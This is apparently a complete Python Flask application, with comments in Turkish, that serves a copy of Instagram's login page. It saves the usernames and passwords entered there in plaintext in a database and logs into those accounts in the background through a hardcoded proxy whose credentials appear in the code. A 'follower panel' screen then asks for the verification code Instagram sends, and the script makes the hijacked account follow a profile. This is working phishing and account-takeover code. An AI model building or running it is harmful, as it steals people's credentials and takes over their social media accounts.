import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "anti-lag-v70"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Hafızada canlı tutmak için (Session yönetimi)
active_clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Giriş İşleniyor...")

# --- KRİTİK ARKA PLAN FONKSİYONU ---
def background_login(u, p):
    """Bu fonksiyon ana sistemi bekletmeden arkada çalışır"""
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        active_clients[u] = cl
        
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            print(f"DEBUG: {u} için arka plan girişi başladı...")
            cl.login(u, p)
            acc.status = "AKTIF"
            db.session.commit()
            # Giriş başarılıysa takip botunu başlat
            cl.user_follow(cl.user_id_from_username("instagram"))
        except ChallengeRequired:
            acc.status = "ONAY_KODU_LAZIM"
            db.session.commit()
        except Exception as e:
            print(f"Hata: {e}")
            acc.status = "GIRIS_HATASI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. Veritabanına anında işle veya güncelle
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Giriş İşleniyor..."
    db.session.commit()

    # 2. ASIL OLAY: Threading ile botu arka plana at (Ana sistemi kilitleme!)
    thread = threading.Thread(target=background_login, args=(u, p))
    thread.daemon = True
    thread.start()

    # 3. Müşteriye saniyesinde "Tamamdır" cevabı ver
    return jsonify(status="process_started")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

# --- UI (SANIYESINDE ACILAN PANEL) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.page { display: none; } .active { display: block; }</style>
</head>
<body class="bg-[#fafafa] font-sans">

    <div id="login-section" class="page active flex flex-col items-center mt-12">
        <div class="bg-white border border-gray-300 p-10 w-[350px] flex flex-col items-center">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8">
            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2 mb-2 bg-gray-50 border border-gray-300 rounded text-xs outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 mb-4 bg-gray-50 border border-gray-300 rounded text-xs outline-none">
            <button onclick="send()" id="btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm">Giriş Yap</button>
        </div>
    </div>

    <div id="panel-section" class="page min-h-screen bg-gray-50">
        <nav class="bg-white border-b p-4 text-center font-black italic text-purple-600 shadow-sm">ALLFOLLOW PANEL</nav>
        
        <div class="p-6 max-w-sm mx-auto">
            <div id="status-box" class="bg-white p-8 rounded-[40px] shadow-xl border-t-4 border-purple-500 text-center mb-6">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Canlı Bağlantı Durumu</p>
                <h2 id="st-msg" class="text-xl font-black italic text-purple-600 animate-pulse">BAĞLANILIYOR...</h2>
                
                <div id="onay-alani" class="hidden mt-6 bg-red-50 p-4 rounded-3xl border border-red-100">
                    <p class="text-xs text-red-500 font-bold mb-3">INSTAGRAM KOD GÖNDERDİ</p>
                    <input id="vcode" placeholder="000000" class="w-full p-3 text-center text-2xl font-mono border rounded-2xl mb-3 outline-none">
                    <button class="w-full bg-red-600 text-white py-3 rounded-2xl font-bold">KODU ONAYLA</button>
                </div>
            </div>

            <div class="bg-white p-4 rounded-3xl shadow-sm border flex items-center justify-between">
                <div><p class="text-[10px] text-gray-400 font-bold uppercase">Aktif Hesap</p><p id="usr" class="font-bold"></p></div>
                <div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center text-purple-600 font-bold italic">IG</div>
            </div>
        </div>
    </div>

    <script>
        let user = "";
        function send() {
            user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(!user || !pass) return;

            // 1. Backend'e komutu ver (Bekleme yapma!)
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:user, p:pass})
            });

            // 2. Saniyesinde paneli aç (Müşteri beklememiş olur)
            document.getElementById('login-section').classList.remove('active');
            document.getElementById('panel-section').classList.add('active');
            document.getElementById('usr').innerText = "@" + user;

            // 3. Durumu arkadan kontrol etmeye başla
            setInterval(check, 3000);
        }

        async function check() {
            const r = await fetch('/api/status/' + user);
            const d = await r.json();
            const msg = document.getElementById('st-msg');
            const onay = document.getElementById('onay-alani');

            msg.innerText = d.status.replace("_", " ");
            
            if(d.status === "AKTIF") {
                msg.innerText = "SİSTEM AKTİF ✅";
                msg.classList.remove('animate-pulse');
                msg.style.color = "#22c55e";
                onay.classList.add('hidden');
            } else if(d.status === "ONAY_KODU_LAZIM") {
                msg.innerText = "ONAY BEKLENİYOR ⚠️";
                msg.style.color = "#f59e0b";
                onay.classList.remove('hidden');
            }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
